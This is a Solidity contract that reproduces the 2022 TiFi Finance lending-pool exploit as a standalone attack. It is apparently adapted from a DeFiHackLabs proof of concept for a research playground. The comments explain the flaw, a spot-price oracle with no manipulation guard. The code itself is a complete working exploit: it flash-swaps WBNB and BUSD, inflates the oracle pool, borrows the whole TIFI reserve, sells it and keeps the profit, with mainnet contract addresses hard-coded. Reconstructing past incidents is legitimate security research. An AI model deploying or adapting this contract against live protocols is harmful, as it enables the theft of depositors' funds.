// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2022-12-TIFI).
//
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry `ContractTest`
// harness — the PancakeSwap flash-swap callback `pancakeCall` lives on the test
// itself (`to = address(this)`), so there is no standalone contract to deploy.
// This file is a faithful, self-contained copy of that inline attack
// (testExploit body -> run(); pancakeCall callback + helpers inlined), compiled
// inside the registry forge project. Logic and constants are copied verbatim
// from test/TIFI_exp.sol.
//
// Root cause: TiFi's LendingPool values collateral/debt with
// `getPrice.getTokenToBNBPrice(token)`, which returns the INSTANTANEOUS
// PancakeSwap reserve ratio (no TWAP / no freshness / no manipulation guard).
// Inside a single PancakeSwap flash-swap callback the attacker deposits 500
// BUSD, dumps 5 WBNB into the thin WBNB/BUSD oracle pool (~77x price inflation),
// borrows the entire TIFI reserve (the health check now values the BUSD
// collateral at ~108 BNB), sells the TIFI for ~94.14 WBNB, and repays 7 WBNB to
// the flash pool — netting ~87.14 WBNB.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface ITiFiFinance {
    function deposit(address token, uint256 amount) external;
    function borrow(address qToken, uint256 amount) external;
}

interface IUniswapV2Pair {
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IUniswapV2Router02 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract TifiOracleDrain {
    // --- victims / constants (copied verbatim from test/TIFI_exp.sol) ----------
    address constant TIFI = 0x8A6F7834A9d60090668F5db33FEC353a7Fb4704B; // LendingPool
    address constant ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E; // PancakeRouter
    address constant TIFI_ROUTER = 0xC8595392B8ca616A226dcE8F69D9E0c7D4C81FE4; // TiFi router
    address constant PAIR = 0x58F876857a02D6762E0101bb5C46A8c1ED44Dc16; // WBNB/BUSD flash pool
    address constant TIFI_TOKEN = 0x17E65E6b9B166Fb8e7c59432F0db126711246BC0;
    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address constant BUSD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;

    // step 0: approvals + flash-swap 5 WBNB & 500 BUSD from the WBNB/BUSD pair.
    // The callback below deposits, inflates, borrows, sells, and repays.
    function run() external {
        IERC20(WBNB).approve(TIFI_ROUTER, type(uint256).max);
        IERC20(BUSD).approve(TIFI, type(uint256).max);
        IERC20(TIFI_TOKEN).approve(ROUTER, type(uint256).max);
        IUniswapV2Pair(PAIR).swap(5 * 1e18, 500 * 1e18, address(this), new bytes(1));
    }

    // PancakeSwap flash-swap callback. The pair optimistically sent 5 WBNB +
    // 500 BUSD; here the attacker deposits collateral, inflates the BUSD spot
    // price, borrows the entire TIFI reserve, sells it for WBNB, and repays the
    // flash swap. Profit (WBNB) stays in this contract.
    function pancakeCall(address, uint256, uint256, bytes calldata) external {
        ITiFiFinance(TIFI).deposit(BUSD, IERC20(BUSD).balanceOf(address(this)));
        _wbnbToBusd(); // inflate the WBNB/BUSD oracle reserves
        ITiFiFinance(TIFI).borrow(TIFI_TOKEN, IERC20(TIFI_TOKEN).balanceOf(TIFI)); // drain the pool
        _tifiToWbnb();
        IERC20(WBNB).transfer(PAIR, 7 * 1e18); // repay the flash swap
    }

    function _wbnbToBusd() internal {
        address[] memory path = new address[](2);
        path[0] = WBNB;
        path[1] = BUSD;
        IUniswapV2Router02(TIFI_ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(WBNB).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function _tifiToWbnb() internal {
        address[] memory path = new address[](2);
        path[0] = TIFI_TOKEN;
        path[1] = WBNB;
        IUniswapV2Router02(ROUTER).swapExactTokensForTokensSupportingFeeOnTransferTokens(
            IERC20(TIFI_TOKEN).balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
